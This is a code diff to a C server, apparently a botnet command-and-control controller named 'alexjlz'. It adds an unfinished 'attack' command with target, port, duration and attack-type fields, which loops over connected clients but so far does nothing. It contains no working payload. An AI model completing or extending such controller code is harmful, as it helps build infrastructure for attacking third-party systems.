@@ -262,12 +262,34 @@ int process_command(struct alexjlz_packet *p, list_p output)
         }
         pthread_mutex_unlock(&client_list_mutex);
     }
+    else if ( strcmp(cmd, "attack") == 0 )
+    {
+        char attack_type[16] = {0};
+        char target[256] = {0};
+        char port[256] = {0};
+        char time[256] = {0};
+        alexjlz_log("CMD:attack");
+        pthread_mutex_lock(&client_list_mutex);
+        struct client *c_iter = NULL;
+        list_iter_p client_list_iter = list_iterator(client_list, FRONT);
+        while ( (c_iter = list_next(client_list_iter)) != NULL )
+        {
+            
+            //bzero(&output_packet, sizeof(output_packet));
+            //sprintf(output_packet.value, "uuid:%s ip:%s\n", c_iter->uuid, c_iter->ip);
+        }
+        list_add(output, &output_packet, sizeof(output_packet));
+        pthread_mutex_unlock(&client_list_mutex);
+    }
     else
     {
         bzero(&output_packet, sizeof(output_packet));
         sprintf(output_packet.value, "Error: Unkown cmd!\n");
         list_add(output, &output_packet, sizeof(output_packet));
     }
+    bzero(&output_packet, sizeof(output_packet));
+    sprintf(output_packet.value, "OUTPUT_END");
+    list_add(output, &output_packet, sizeof(output_packet));
     return 0;
 }
 void *serve_alexjlz( void *arg)
